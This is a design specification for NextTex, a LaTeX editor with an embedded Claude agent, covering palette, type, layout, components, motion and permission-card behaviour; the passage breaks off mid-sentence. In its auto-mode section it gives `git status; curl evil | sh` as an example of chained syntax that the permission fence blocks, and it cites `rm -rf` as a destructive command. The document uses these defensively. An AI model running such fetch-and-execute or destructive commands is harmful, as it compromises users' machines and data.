# NextTex — Design Specification

> This document is the reference for all front-end work. It was produced before
> implementation and the built UI is reviewed against it. When the implementation
> and this document disagree, that is a bug in one of them — decide which, and
> fix that one. Do not let them drift silently.

## 1. Design direction

**The composing room.** The rendered PDF is the only white object the *app* chooses;
everything around it is the grey surround of a proofing table, and the only saturated colour
in the entire chrome is the pen the agent writes with.

> Revised. This sentence used to read "the only white object on screen", flatly, and §23
> records why it could not stay that way: a writer may now set the editor page to paper
> white, and three of them will. The rule the sentence was protecting is still the rule —
> the app is drawn on proofing grey and defaults to it, and nothing in the chrome is ever
> white — but the editor page is the one surface the writer may overrule, because the object
> it holds is the thing they are *making* rather than the thing they are *judging*. The
> claim is now about what the app picks, not about what can be on screen.

§23 also records the other half of the light theme, which is that it is no longer light all
the way through. The rail, the agent column, the status strip and everything that floats are
furniture, and they take the dark palette even while the theme is light — so the light theme
is a lit editor and a lit page set into dark furniture, rather than a cloud. This comes from the practice of judging
printed matter — you set proofs against a neutral mid-grey, never against white, because
white chrome around a white page makes the page stop reading as an object. It gives NextTex
a light theme no other code editor has, keeps the UI permanently subordinate to the typeset
page, and leaves violet free to mean exactly one thing: *Claude touched this*.

Relationship to NexusQC, the sibling app, is deliberate:

| Same hand | Different tool |
|---|---|
| One superfamily, sans + mono, no third face | Adobe Source (publishing lineage), not IBM Plex (corporate lineage) |
| CSS custom properties mapped through Tailwind `@theme inline` | Green-biased grey, not blue graphite |
| 90–180 ms durations, nothing decorative | Accent reserved for the agent, not a global primary |
| Dense 13 px instrument UI, semantic status colours | Light *and* dark, both authored; NexusQC is dark-only |

## 2. Palette

Twelve tokens per theme. `--paper` is a constant `#FFFFFF` in both themes — it is painted by
PDF.js and is never themed. `--line` and the washes are derived, not authored:
`--line: color-mix(in oklab, var(--ink-3) 55%, transparent)`,
`--pen-wash: color-mix(in oklab, var(--pen) 12%, transparent)`,
`--hint-wash: color-mix(in oklab, var(--hint) 14%, transparent)`.

| Token | Light | Dark | Use |
|---|---|---|---|
| `--surround` | `#B9BEB8` | `#0A0C0B` | App background; the field the PDF sits on |
| `--surface` | `#E3E7E2` | `#121614` | Panes: rail, editor body, chat column |
| `--surface-2` | `#D4D9D3` | `#1E2320` | Raised/inset: tab bar, status strip, hover fills, code blocks |
| `--surface-3` | `#C6CBC5` | `#2A302C` | Pressed and selected states inside a raised surface |
| `--ink` | `#141715` | `#E3E8E2` | Primary text |
| `--ink-2` | `#373B36` | `#B0B5B0` | Secondary text, user messages, consequences |
| `--ink-3` | `#4E534D` | `#909892` | Metadata, file extensions, line numbers, idle dot |
| `--pen` | `#6F2998` | `#C988E7` | Agent identity, SyncTeX highlight, active-file bar, primary button |
| `--hint` | `#00626D` | `#3FC6D2` | Live and interactive states that are *not* the agent: streaming stopped, a switch that is on, a control the eye should find |
| `--error` | `#9F1912` | `#F47365` | Compile errors, destructive hover |
| `--warn` | `#7D5300` | `#D9A539` | The preview is behind the source; chktex severity bars; permission gate bar |
| `--ok` | `#196131` | `#5ABD7B` | The preview matches the source; git clean, added diff lines, resolved-allow dot |

Two constraints govern any change to these, both arithmetic rather than taste, and
both asserted in `frontend/src/contrast.test.ts`.

**The light accents cannot be separated by lightness.** Every one of them has to
clear 4.5:1 on `--surface-2`, which caps all five at a relative luminance of about
0.11 — so they sit within seven L\* of one another and always will, in any light
theme that rule governs. The separation is carried by hue and chroma instead:
violet 278°, red 3°, amber 40°, green 140°, teal 186°, each at or near the chroma
ceiling its hue allows at that lightness. Anyone reading the palette and wondering
why the light accents look so close together should stop before reaching for a
brighter value; the value is not available.

**The ink hierarchy can only be opened from the middle.** `--ink-3` sits a quarter
of a point under its own ceiling on `--surface-3` in light, and on its floor in
dark. When the three inks need more separation — and light's `--ink-2` and
`--ink-3` were once 3.5 L\* apart, two steps pretending to be three — it is
`--ink-2` that moves.

**Both themes are authored and chosen, not inherited.** A toggle in the rail
header stamps `data-theme` and the choice is remembered per browser; dark is the
default. `prefers-color-scheme` covers only the first frame before the app
stamps its own choice.

**Both are pitched darker than the original specification.** The light theme is
a proofing grey rather than a white UI — a page cannot be the brightest object
on screen if the chrome around it is also white — and the dark theme's surround
is nearly black so the sheet reads as lit.

All text tokens clear 4.5:1 on their own surface (light `--ink-3` 4.6:1, dark `--ink-3`
4.8:1, `--pen` 6.4:1 light / 6.9:1 dark).

**Neutral hue bias: green, at near-zero chroma** (2–4 points of G above R and B). Two
reasons. First, simultaneous contrast: a warm surround pushes the paper white toward cold
blue, a blue surround pushes it toward yellow; a chromatically near-dead grey leaves
`#FFFFFF` reading as paper. Second, identity — every code editor and NexusQC itself sit on
blue-grey. The bias is faint enough that nobody will call it green; they will call it grey,
and the paper will look whiter than it does in VS Code.

**Pen hue.** `#74408E` / `#C48EDA` sit at ~280–285°; NexusQC's `#6e8cff` is ~226°. Roughly
55° of separation — never confusable side by side. The colour is methyl-violet: the ink of
hectograph duplicators, which is what mid-century thesis copies were printed in. It is
explicitly *not* `#6366F1`, the indigo every AI-built app reaches for.

**The dark surround is deliberately near-black (`#141715`).** In dark mode the PDF is the
only light source — a lightbox. To make that read as a lit sheet rather than a hole punched
in the UI, the page gets a 1 px `--line` border plus `0 8px 24px rgba(0,0,0,0.55)`. In light
mode the same page gets a hairline border only, no shadow.

*The build gives it a shadow anyway* — `0 1px 4px rgba(0,0,0,0.12)`, a 4 px
ramp — and a design review flagged the disagreement. The build wins here: the
light theme is a proofing grey, and a page with a border and no shadow reads
as pasted onto the pane rather than lying on it. The rule this paragraph was
protecting — that the page is the brightest, most physical object on screen —
is better served by the shadow than by its absence.

Dark is **not** an inversion: inter-surface contrast steps are compressed
(`#141715 → #1A1E1B → #222623`, ~6–8 L* apart, versus ~10–12 in light), and `--ink` is
`#DDE2DD`, never `#FFFFFF` — pure white text beside a pure white PDF page is the fastest way
to make the page stop looking like paper.

## 3. Typography

Google Fonts only. One superfamily, three roles.

- **UI chrome — Source Sans 3** (400/500/600). Humanist, Adobe's publishing programme,
  drawn for small sizes, with genuine tabular figures. Not Inter.
- **Authored prose — Source Serif 4** (400/400 italic/600). Used for exactly one thing: the
  agent's replies, plus the project name in the switcher. Everything the *machine* says is
  sans; everything that is *prose about a document* is serif. Typeface becomes structure
  rather than decoration, and the chat reads as marginalia on a manuscript rather than a
  messaging app. Source Serif is Fournier-derived, so it will never be mistaken for the
  PDF's Times sitting two panes away.
- **Editor and literal machine strings — Source Code Pro** (400/600). Chosen over JetBrains
  Mono because it shares the Source skeleton, and because **it ships no ligatures**. That is
  non-negotiable for LaTeX: `--` and `---` must never fuse on screen when they are en- and
  em-dash *source*.

**The mono rule:** monospace means "this is a literal string the machine produced or
consumes" — a git SHA, `file:line`, a shell command, a log excerpt, a filename in a chip.
Merely numeric metadata (word counts, build times, diff counts) stays in Source Sans 3 with
`font-variant-numeric: tabular-nums`. No monospace as decoration.

| Role | Family | Size / line-height | Weight / tracking |
|---|---|---|---|
| `micro` — gutter numbers, counts, badges, timestamps | Source Sans 3 | 11 / 16 | 500, `+0.004em`, tnum |
| `meta` — secondary labels, tab titles, diagnostic messages | Source Sans 3 | 12 / 18 | 400 |
| `ui` — default: tree rows, buttons, permission headline | Source Sans 3 | 13 / 20 | 400 (500 buttons) |
| `ui-lg` — pane headings, project name | Source Serif 4 / Sans 3 | 15 / 22 | 600 |
| `prose` — agent messages | Source Serif 4 | 14.5 / 23.5 (1.62) | 400, max 68ch |
| `code` — CodeMirror | Source Code Pro | 13.5 / 22 | 400 |
| `code-sm` — log excerpts, diffs, chip filenames | Source Code Pro | 12 / 18 | 400 |
| `display` — empty states, first-run setup only | Source Serif 4 | 22 / 28 | 600, `-0.01em` |

No all-caps tracked labels anywhere. Sentence case throughout, including buttons.

## 4. Layout

One `100dvh` shell, `overflow: hidden`, four columns with three drag handles. Handles are a
1 px `--line` rule with an 8 px invisible hit zone; `col-resize` cursor; double-click resets
to default; widths persist to `localStorage` per project.

| Pane | Default | Min | Max |
|---|---|---|---|
| Rail | 240 px | 180 px | 400 px |
| Editor | flex | 420 px | — |
| PDF | flex (splits remaining 50/50 with editor) | 320 px | 60% of the pair |
| Claude | 380 px | 320 px | 560 px |

**Claude is a docked column, not a slide-over, whenever there is room.** The loop this app
exists for is write → see → ask → see. A slide-over covering the PDF breaks that loop at the
exact moment the user is checking the agent's work.

Breakpoints:

- **≥ 1400 px** — all four docked: 240 + 380 leaves 780 px for the editor/PDF pair.
- **1100–1399 px** — Claude becomes a slide-over from the right at 380 px, over the PDF,
  with an 8 px shadow and no scrim. Rail still docked.
- **< 1100 px** — rail auto-collapses.
- **< 900 px** — editor and PDF become a two-item segmented toggle, in the *tab
  bar* rather than the status strip: the strip is 26 px and already drops
  segments at that width, and a control that appears only when it has room is
  not a control. Only
  one is mounted.

**Rail collapse is to a 26 px strip carrying one label, not to an icon bar.**
This section originally said zero, and the build does not: collapsing to
nothing leaves no way back except a keyboard shortcut, which is the same hole
the agent button had. What is rejected is the *icon bar* — a 40 px activity
bar is VS Code's shape
and a default. Cmd-B hides the rail entirely; the project name then moves to the left end of
the tab bar as a non-closable chip with the switcher chevron, and the git dirty count moves
into the compile status strip as `main +4`. Nothing is lost and the editor gains 240 px.

**Spacing scale:** 2 / 4 / 6 / 8 / 12 / 16 / 24 / 32; everything quantises to 4. Interactive
row heights: 26 (tree rows, resolved cards), 28 (diagnostic rows, buttons), 32 (tabs), 26
(status strip). Pane padding 8 horizontal / 6 vertical — this is an instrument, not a
document.

**Radius is a hierarchy, not a constant:** 0 on panes and drawers, 3 px on rows, chips,
buttons and inputs, 5 px on cards. No shadows anywhere except the dark-mode PDF page and the
slide-over.

**Diagnostics live in a drawer scoped to the editor pane**, docked below the status strip —
not full-width, not inside the Claude panel. Height 0 when clean; 168 px (six rows) when
open; drag to 320 px.

**It never opens itself.** This section specified an auto-open on the first build that
produced errors, and the implementation deliberately did not do it. The build fires 1.6
seconds after you stop typing, which is very often mid-thought — and a list of errors
jumping up over the document at that moment, about a sentence you already know is
unfinished, is the most irritating thing this app could do. The strip says `2 errors` and
the gutter marks the lines; opening the drawer is the reader's decision. When it does
open, the first thing in it is the plain-English explanation of the *first* error, which
is the one worth reading.

The strip and the gutter carry the news instead, which is the general rule: say it where
the writer already is, and let them come to the detail.

## 5. Component specs

### File tree row

26 px tall. `padding-left: 10px + depth × 13px` — 13 px is the width of a Source Sans
lowercase *n* at 13 px, so indentation reads as a typographic quad rather than an arbitrary
gap. A 16 px left slot holds an 8 px chevron on folders, nothing on files.

**No file-type icons.** The filename carries its own kind typographically: stem in `--ink`,
extension in `--ink-3` — `02_theory` `.tex`. That reads as a name rather than a path and
scans faster than a colour-coded icon set.

States: rest transparent; hover `--surface-2` with no transition; **active file**
`--surface-2` plus a 2 px `--pen` bar flush against the row's left edge, full height, square;
keyboard focus a 1 px inset `--pen` outline; folder drag-over gets `--pen-wash` fill and a
1 px `--pen` bottom border. Fill radius 3 px.

Right slot (16 px), in priority order: error count in `--error` micro; unsaved dot (5 px
solid `--ink-2`); git status letter (`M`/`A`/`?`) in `--ink-3` mono 10 px. On row hover that
slot becomes a `⋯` opening, in order: rename, move to…, set as main document, history,
download, upload here, new file here, new folder here, move to trash. (This paragraph
described a menu of *rename / duplicate / download / delete / new file here* for some time
after the built menu had stopped matching it, which is the sort of drift this document
exists to avoid. Duplicate was specified and never built; it is dropped rather than left
described.) **Rename is inline** — the label becomes an input in place, same font, same
position, 1 px `--pen` underline, Enter commits, Escape reverts. Never a modal.

Drag-drop upload highlights the target folder row only, never the whole panel. The project
root has no row, so a drop aimed at it — on the empty area below the tree, or on the Files
bar — highlights the **Upload button** instead, which stands in as the root's row.

**Dragging.** A row is draggable onto any folder, and onto the Files bar for the project
root. The row being dragged drops to 50 % opacity so the gesture has a visible subject; the
folder under the pointer takes the same `--pen-wash` fill and `--pen` underline a file drop
from the desktop gets, because to the writer they are the same act. A destination that
cannot take it — the folder itself, its own descendant, or the folder it already sits in —
shows no highlight at all and the cursor says *no*: refused while it is being dragged
rather than attempted and reported.

### Reading mode and writing mode

A **double click on a pane's header gives that pane the window**, and a second double click
restores the layout exactly as it was rather than unfolding everything. A writer who had
the agent hidden before they started reading does not want it back for having read a page.
The preview's header and the source's tab strip both do this; the agent's does not, because
a column of conversation with nothing to converse about is not a mode anybody wants.

The two modes are not symmetric. **Reading folds everything but the page.** **Writing folds
everything but the source and the file list** — somebody writing is still moving between
chapters, and a mode that hides the way to the next one is a mode they leave immediately;
somebody reading the typeset page has nothing to navigate to. Writing mode brings the file
list back even at a width where the window had folded it away on its own, because asking
for the mode is an explicit request for it — and leaving the mode gives the window its
own behaviour back.

It is deliberately **not persisted**. What reaches `localStorage` is the arrangement the
writer chose, so a reload in the middle of a mode comes back to their real layout rather
than to a collapsed window with no memory of what preceded it. Folding anything by hand
ends the mode for the same reason: the layout it would restore is no longer the one they
left.

A **single click on the same headers folds that pane away**, which means one target answers
two gestures, and the fold has to wait 250 ms to find out which it is. That is the shortest
wait that does not turn a deliberate double click into a fold followed by a mode. The
agent's header, which has no second gesture, folds immediately.

**On the source pane the target is the empty run of the tab strip**, never a tab. It is the
only part of that row that is not already something, and it shrinks as tabs fill the strip
— which is the right behaviour rather than a limitation: a writer with a dozen files open
has not left themselves a place to click, and a fold they did not ask for is worse than a
gesture they have to reach the chevron for. Below 900 px, where the two panes share one
view, neither gesture exists: there is nothing to fold them into.

### Files bar

26 px, directly under the 32 px project header, and the header's bottom rule moves down
onto it so the two read as one masthead rather than two stacked bands. Fill is `--surface`,
the same plane as the tree: `--surface-2` is the tree row's own hover fill, and a permanent
band of it above rows that hover to it reads as a stuck hover.

Three controls, abutting, no gap, in the header's own button style (`quiet t-micro
h-[26px] rounded-[3px] px-2`): **New file**, **New folder**, **Upload**. A container query
shortens the first two to *File* and *Folder* below 208 px; both short forms are substrings
of the accessible name, so a spoken command matching what is on screen still works. A 22 px
magnifier sits at the right end, past the spacer, and opens the filter row below.

It exists because the alternative was a reachability hole rather than a convenience gap.
Every file operation hung off a row's `⋯` menu, so there had to *be* a row: a new project is
created as one empty document, and its first folder could only be made by opening the menu
on `main.tex` and knowing that "New folder here" resolves to the folder containing it. The
cost is one tree row of a rail that is usually 800–1000 px tall.

The bar does not grow. No collapse-all — ArrowLeft already collapses a folder.

**The filter row.** One 26 px row under the bar, shown only when the magnifier is pressed:
a full-width borderless input on `--surface-2` reading *Find a file*, with a match count in
`t-micro` at the right. Typing filters the tree to the matching rows and the folders on the
way down to them, drawing every folder open without touching what the writer had collapsed
— so clearing the box gives back the tree they had rather than one unfolded on their
behalf. Escape clears the query, and Escape again closes the row and returns focus to the
tree. Rows keep their ordinary indent and typography; there is no match highlight, because
`--pen` means *the agent touched this* and a second accent would be a new colour. A query
that matches nothing gets one `t-meta` row saying so, in the writer's own words back to
them.

### Upload chooser

A popover (`fixed`, 264 px, radius 5, `shadow-float`), never a modal — this app has none.
`role="dialog"` without `aria-modal`, because the page behind it stays live and is not
inert; focus is not trapped, and Escape, Cancel or a click away all discard the picked
files and return focus to whatever started the upload.

**The file picker opens first, and this appears afterwards.** Asking "which folder?" before
a file has been chosen is two deliberate steps every time; asking after means the popover
already knows the filenames, so *where* and *one of these already exists* are answered in
one surface instead of a wizard. It therefore only appears when there is something to ask:
a file dropped on a folder has named its destination by being dropped there and goes
straight in unless a name collides.

Inside: a heading naming the file or counting them; a destination row that expands a
`role="listbox"` of every folder, indented on the tree's own 13 px quad, selection following
focus, with **New folder here** below a rule as a plain button outside the list; a manifest
of one 22 px row per file, each with a `Skip` toggle; and, only when something collides, a
count, a two-button group (**Replace** / **Keep both**) and a line saying what that will do.

**Replace is the default.** The dominant case is re-exporting a figure, and it is only a
safe default because what it replaces is now kept. "Keep both" as a default quietly fills a
thesis with `plot (2).png` and then compiles the wrong one.

### Editor tab

32 px tall, 10 px horizontal padding, min 96 px, max 200 px. Label at `meta` 12 px, stem
`--ink` / extension `--ink-3`; overflow truncates the **stem from the middle** so the
extension survives: `04_o-nitro…mics.tex`.

Tabs are separated by 1 px `--line` rules, not pills. The **active** tab takes `--surface`
(identical to the editor body, so it merges into the canvas), carries a 2 px `--pen` bar
along its *top* edge, and has no bottom border. Inactive tabs sit on `--surface-2` with a
1 px bottom line. Dirty state replaces the close × with a 5 px hollow `--ink-2` ring, solid
× on hover. A file with errors turns its extension `--error` and adds a 3 px `--error` dot
after the label. Middle-click closes. Overflow scrolls horizontally with a hidden scrollbar
plus a 24 px chevron at the right carrying the hidden count.

Tab switching is instantaneous — content swaps in the same frame, no crossfade.

### Diagnostic row

28 px collapsed. Grid:
`[3px severity bar] [40px line no.] [8px] [message, flex] [file, auto] [Fix, on hover]`.

Severity bar is a 3 px full-height rule in `--error` or `--warn` — no icons, no badges. Line
number is Source Code Pro 11 px, tabular, right-aligned, `--ink-3`. Message is `meta` 12 px
`--ink`, single-line truncated. If the diagnostic is in a file other than the active one,
the filename appears at the right in `micro` `--ink-3`.

Hover: `--surface-2` fill; the left gutter reveals a disclosure chevron. Click jumps the
editor to the line and flashes it. Selected row keeps a 2 px `--pen` left bar. Expanded, the
row grows to show up to 3 lines of raw TeX log in Source Code Pro 12/18 on `--surface-2`
behind a 1 px `--line` left rule; expansion is instant, no height animation.

A `Fix` button (22 px, 3 px radius, 1 px `--line` border, `micro` label) appears on hover at
the right. It **seeds the Claude composer** with
`Fix: Undefined control sequence \citep (chapters/02_theory.tex:118)` and focuses it — it
does not send. The user always presses Enter on their own message.

**Editor gutter marker:** a 3 px severity-coloured bar filling that line's gutter cell,
aligned with the line-number column. No icon, no glyph. Squiggle is a 1.5 px dotted
underline in `--error` / `--warn` at 60% opacity — dotted, not wavy, because wavy underlines
at 13.5 px on a dense LaTeX line become visual mush.

### Agent message

Not a bubble, not an avatar. Margin-note layout: a 3 px full-height rule at the far left —
`--pen` for Claude, `--line` for the user — then a 12 px gutter, then content. Speaker is
named once at the top in `micro` sentence case (`Claude` in `--pen`), never in caps.
Timestamp appears only on row hover, `micro` `--ink-3` tabular, right-aligned.

Claude's prose is `prose` (Source Serif 4, 14.5/23.5, max 68ch). The user's message is `ui`
13 px `--ink-2` on a `--surface-2` block, 3 px radius, 8 px padding — the visual weight is
deliberately reversed from every chat app, because here the agent's output is the artefact
and the user's prompt is the annotation.

Streaming: text lands in ~50 ms batches, no per-token fade, no typewriter effect. A 2 px ×
1.1em `--pen` caret trails the text; it does **not** blink while tokens are arriving and
blinks at 1.06 s when generation pauses. Code blocks inside messages: `code-sm`,
`--surface-2`, 3 px radius, 8 px padding, no border, copy affordance on hover only. 20 px
between messages, no dividers.

### Edit chip

Sits inline in the stream, directly after the sentence that produced it. 24 px tall, 3 px
radius, `--pen-wash` fill, no border. Contents: filename stem in Source Code Pro 12 px, then
`+12 −3` in `micro` tabular (`+` in `--ok`, `−` in `--error`), then on hover `Show` and
`Undo` at the right.

Clicking the chip body expands a unified diff **in place**: max-height 220 px, scrollable,
Source Code Pro 12/18, added lines on `--ok` at 10%, removed on `--error` at 10%, 1 px left
rule, line numbers `--ink-3`. Expansion is instant.

**The connective move:** hovering a chip flashes the corresponding line range in the editor
with `--pen-wash` for as long as the hover is held. That is the cheapest way to answer
"where did it do that" without leaving the chat.

Multiple edits to one file in a single turn collapse into one chip with net counts,
expanding to a grouped diff. `Show` on a file that is not open opens it in a tab, scrolled
to the range, without stealing focus from the composer.

**Undo is a reverse patch, and the spec says what happens when it cannot apply.** While the
patch applies cleanly, `Undo` is live. If the user has typed inside that range since, the
chip drops `Undo`, keeps `Show`, and the hover hint reads `Changed since — can't undo
cleanly`. On undo, the chip collapses to a 20 px struck-through line — `Reverted —
methods.tex`, `--ink-3` — with a `Redo` link live for 10 s. The reverted chip then **stays
in the transcript permanently**. The chat is a record of what was done to the manuscript;
nothing in it ever disappears.

### Resolved permission

One 26 px row, `stream-indent`, a 6 px dot and a `t-micro` line in `--ink-3`. Three states,
not two: `--ok` for what a person allowed, `--ink-3` for what they refused, and `--warn` for
what was allowed without anybody being asked — a rule set earlier, or automatic approval.
An action nobody was asked about is not the same as one the writer allowed, and the record
must not read as though it were. The command itself stays in `t-code-sm`, as it is
everywhere else.

### Permission card

Inline in the stream, not a modal — but it blocks: the composer disables and reads `Waiting
on your approval` in `--ink-3`. Card is `--surface-2`, 1 px `--line` border, 5 px radius,
12 px padding, with a 3 px **`--warn`** left bar. Warn, not pen: this is a gate, not the
agent talking.

1. **Headline**, `ui` 13 px `--ink`, active voice, plain English: `Run a shell command` /
   `Delete figures/old_scan.png` / `Write outside the project`.
2. **The literal thing**, Source Code Pro 12 px on an inset `--surface` block, 8 px padding,
   3 px radius, wrapped, 6 lines then scroll.
3. **Consequence**, one line, `meta` `--ink-2`, only when it is not obvious: `Removes every
   build artefact in build/.`
4. **Buttons**, 28 px, 6 px gap: **Allow** (`--pen` fill, `#FFFFFF` label, 3 px radius,
   13 px/500) · **Allow always** (ghost, 1 px `--line`, `--ink`) · **Deny** (ghost,
   `--ink-2`; on hover label → `--error`, border → `--error`). Keyboard hints `A` / `⇧A` /
   `D` appear in `micro` `--ink-3` inside the buttons when the card holds focus.

`Allow always` shows its scope on hover in `micro` `--ink-3`: `Remembers: shell commands
starting with latexmk`. Scoped by command prefix — never a blanket grant.

**350 ms input shield.** For 350 ms after mount the buttons ignore clicks and keys, at full
opacity, with no visible change. It is the one place in this app that accepts added latency:
a card appearing under a cursor already travelling toward the composer must not be able to
approve `rm -rf` on the way past.

Resolved, the card collapses to a 26 px line — `Allowed — ran latexmk -C`, `--ink-3`, with
an `--ok` dot for allowed and an `--ink-3` dot for denied — and stays there forever.

### Compile status strip

26 px, full width of the editor pane, docked at its bottom above the diagnostics drawer.
`--surface-2`, 1 px `--line` top border, `micro` tabular `--ink-2`, 10 px horizontal padding.
Segments are separated by 12 px of space and a 1 px × 10 px `--line` vertical rule — **never
a middle dot**.

Left, a 6 px dot plus one word:

| State | Dot | Label |
|---|---|---|
| idle | 1 px `--ink-3` ring, hollow | `Ready` |
| compiling | solid `--pen` | `Compiling` |
| ok | solid `--ink-3` | `Built 1.06s` |
| warnings | solid `--warn` | `2 warnings` (click opens drawer) |
| errors | solid `--error` | `3 errors` (click opens drawer) |

**A clean build renders in no colour at all.** Green for success is the reflex, and it means
the strip lights up on every keystroke-triggered rebuild — dozens of times an hour —
training the user to ignore it. `--ok` is spent on git and permissions, where it fires
rarely and means something. Success here is the *absence* of colour, which makes `--warn`
and `--error` the only things that ever catch the eye.

A 2 px indeterminate `--pen` hairline is pinned to the strip's top edge during compiles —
**but only if the compile passes 400 ms.** A 1 s task with an instant spinner reads as slow;
a 1 s task where the indicator never appears reads as instant. On completion the hairline is
removed with no exit animation.

Centre: `chapters/02_theory.tex` (mono 11 px) · rule · `Ln 118, Col 24`. Right: `8,412
words`, click toggling chapter ⇄ document scope, and a rebuild affordance that appears only
on strip hover.

**The strip never reflows.** Every numeric field is tabular with a reserved min-width, so
digits changing during a compile shift nothing. A status bar that jitters makes the whole
app feel loose.

### Git section (rail footer)

Docked to the rail bottom, 1 px `--line` top border, max three rows: branch in Source Code
Pro 12 px with `↑2 ↓0` in `micro`; `4 files changed` in `--ink-2`, click expanding an inline
list of dirty paths; a 26 px `Commit and push` button. Clean state shows `main` with an
`--ok` dot and no button. First run replaces all of it with one 5 px-radius card — `Back
this up to GitHub` / `Set up` — dismissible, and once dismissed or configured it never
returns.

## 6. Motion

Durations: **0 / 90 / 120 / 180 ms**. Nothing exceeds 180 ms. Easing is
`cubic-bezier(0.22, 0.61, 0.36, 1)` everywhere; there is no second curve.

**Does not animate — 0 ms, deliberately:** pane resize while dragging (the pane must be
welded to the cursor); tab switching and editor content swaps; file tree expand/collapse (a
150 ms accordion on a chapter folder is the single most sluggish-feeling thing an editor can
do); diagnostic row expansion; edit-chip diff expansion; PDF re-render and page paint; every
status strip text and dot change; row hover fills (hover feedback that fades is hover
feedback that lags); streaming text.

**Animates:**

| What | Duration | Why |
|---|---|---|
| Permission card entry — opacity 0→1, `translateY(2px)` | 90 ms | It interrupts; it should be seen arriving, not blink into place |
| Slide-over Claude panel, `translateX` | 180 ms | Shows where it came from and where it goes back to |
| Edit-chip collapse on undo (height) | 120 ms | Shows the reversal actually happened |
| SyncTeX highlight rectangle, fade out | 700 ms | Long enough for the eye to find it after a jump |
| Compile hairline (indeterminate sweep) | 900 ms loop, appears only after 400 ms | |
| Streaming caret blink | 1.06 s, only while paused | |

No toasts. No skeletons. No shimmer. No spinners anywhere. No hover lift, scale, or shadow
on any card. No page-turn animation in the PDF.

`prefers-reduced-motion: reduce` collapses every transform and height transition to 0 ms and
keeps opacity changes at 90 ms.

**Anti-jump rule for the PDF**, which is a motion decision even though nothing animates:
scroll position is anchored to *page index + normalised offset within that page*, not to a
pixel `scrollTop`, so a rebuild that changes the page count does not slide the view. The new
document renders into an offscreen canvas layer and swaps in a single frame — the pane is
never blanked, never shows a loading state, and never returns to page 1.

## 7. Three things deliberately not done

**1. No loading indicators for compiles.** The default is a spinner or skeleton the instant
a build starts, plus a green checkmark when it lands. Neither is here. Compiles take ~1 s,
and a spinner shown at 0 ms on a 1 s task is what *tells* the user the task is slow — it
converts an imperceptible wait into a watched one. Instead the dot changes colour in the
same frame, the PDF keeps showing the last good render, and a 2 px hairline appears only if
the build crosses 400 ms. Success is monochrome, because a green checkmark firing on every
debounced rebuild becomes noise within an hour.

**2. No full-width bottom console with `Problems | Output | Terminal` tabs.** That is the
VS Code shape and it arrives by reflex in every editor-like brief. It is wrong here: it
takes height from the PDF, which is the entire point of the right half of the screen, and it
separates an error message from the source line it refers to by the full width of the app.
The diagnostics drawer is scoped to the editor pane, so error → line number → source → `Fix`
is one vertical eye path in one column.

**3. No chat bubbles, avatars, or a warm-cream-plus-terracotta document aesthetic.** The
agent panel is the highest-risk surface for looking generic — rounded bubbles, a circular
avatar, alternating alignment, a gradient send button. Instead the agent is set in a serif
at 68 characters behind a 3 px violet rule, with the *user's* message given the lesser
visual weight. Likewise the app is not cream-and-terracotta and not graphite-and-neon: it is
a proofing grey that exists to make the white page look white, with the accent borrowed from
hectograph violet — the ink theses were actually duplicated in.

Also cut, quietly: all-caps tracked eyebrow labels, `A · B · C` middle-dot meta strings, `→`
glyphs on buttons, monospace as decoration for small labels, and a single global
border-radius (0 for panes, 3 for rows, 5 for cards — the radius encodes what kind of object
you are looking at).

## 8. Deviations recorded during implementation

Each of these departs from the specification above. They are written down
rather than left implicit, so the next person to read both can tell a
decision from a drift.

**Two animations repeat without being asked, not one.** §10 claims the breathing
compile dot is the only one. The agent's activity dot is the second, and for the same
reason: a turn can spend twenty seconds inside a tool with nothing arriving in the panel,
and a still indicator beside a still transcript is indistinguishable from a turn that has
stopped. It pulses at 1400 ms — slower than the compile dot, because it sits beside the
agent's name for the whole of a turn rather than for a second — and it stops entirely under
`prefers-reduced-motion`.

**The 350 ms input shield is visible.** §5 says the buttons ignore clicks "at full opacity,
with no visible change". As built they fade in over the shield. The argument for the
original is that a dimmed button invites a wait; the argument for what shipped is that a
button which looks live and does nothing is the more confusing of the two failures, and the
shield exists precisely because a card can arrive under a cursor already moving. Recorded
as it is, deliberately.

**The `Allow` label is white on light and ink on dark.** §5 specifies `#FFFFFF`. White on
the dark theme's `--pen` measures 2.57:1 and fails; dark ink on it measures 6.20:1. The
build is right and the specification was wrong. The same applies to any filled `--pen`
button in the dark theme.

**Filled `--pen` is conditional on Send.** §10 says filled violet is "`Allow` and `Send`
only". Send carries the fill only when the composer has something in it; empty, it is a
ghost. That is the rule as it should read: the fill marks the action that is available,
not the button that is present.

**The agent's `⋯` opens a drawer, not a popover.** The file row's menu overlays the tree;
this one pushes the transcript down. They differ because the transcript is pinned to its
bottom and a popover over it would cover the newest turn — the thing most likely to be
being read. It matches the Usage panel directly above it, which is the surface it sits
next to, and both are dismissed the same way.

**The source/preview toggle below 900 px lives in the tab bar**, not the status strip as §4
says. It is a view switch, and the tab bar is where this app puts view switches. Its
selected state is `--hint`, per §10.

**There is a filter box after all.** §5 said there would not be one: "tree type-ahead does
that job for nothing, and a thesis has tens of files, not thousands." That reasoning holds
for a thesis the writer is holding in their head, and stops holding for one reorganised
over a year. Type-ahead can only jump to a name you can already spell from its first
letter, in a tree you can already see; it cannot answer *where did the o-nitrophenol figure
end up*. The box was asked for by the writer using the app daily. It costs one 26 px row,
shown only when the magnifier is pressed, and type-ahead is kept exactly as it was for the
keyboard path.

**The permission fence has a switch.** §5's permission card is written as though a card is
unconditional, and for the actions that matter it still is. But a card for every action is
how a card stops being read — the same argument this document already makes for waving
read-only tools through — and a writer who has approved the same build command forty times
is being trained to click *Allow* without looking. Auto mode is therefore offered, and the fence stays up in four
places: a write outside the project root, because that is the one action that leaves the
thing the writer pointed the agent at; a file inside the project that the build executes,
because approving the writing is not approving the machinery that runs it; a shell command
carrying syntax no first-word rule can describe, because `git status; curl evil | sh` starts
with `git`; and anything that leaves the machine, because the address and the payload are
both chosen from files that may have arrived from somebody else. Two further things hold it
honest: every automatic approval is still emitted as a card that arrives already answered, so
nothing vanishes from the record; and while the mode is on a persistent `--warn` **Auto**
chip sits beside the agent's name, because a fence that is down and silent is worse than no
fence.

**A card that stops has to say which rule stopped it.** This was the half that was missing,
and it was reported by the writer rather than found by reading: with the switch on, auto mode
would simply stop, and nothing on the card said why. Worse, the card was often describing a
different rule. A write to a `latexmkrc` was announced as a write outside the project, which
is false twice over, since the file is inside the project and the rule that held it back was
the one about files the build runs. And a command carrying shell syntax was explained with
"it runs more than one command", which is true of four of the seven characters and false of
the other three: `latexmk > build.log` runs one command. Each card now works out for itself
which rule put it up, from the same facts the fence used, and says so in the writer's terms.
The reason line is empty when the switch is off, because then the answer is that this app
